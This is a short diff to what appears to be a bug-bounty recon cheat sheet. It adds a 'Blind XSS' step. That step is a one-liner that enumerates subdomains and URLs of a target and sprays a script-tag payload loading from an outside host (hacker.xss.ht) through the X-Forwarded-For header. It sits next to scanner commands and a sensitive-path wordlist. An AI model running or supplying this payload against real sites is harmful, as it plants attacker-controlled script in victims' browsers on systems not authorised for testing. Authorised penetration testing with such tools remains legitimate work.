@@ -155,6 +155,9 @@ for i in $(cat aliveoutfile.txt)do snallygaster -h $i;done <br>
 <br>
 Run socialhunter for social media broken links <br>
 <br>
+<h4> Blind XSS </h4><br>
+subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"<br>
+<br>
  
 <h1>QUICK WINS WORDLIST</h1><br>
 /phpinfo.php<br>
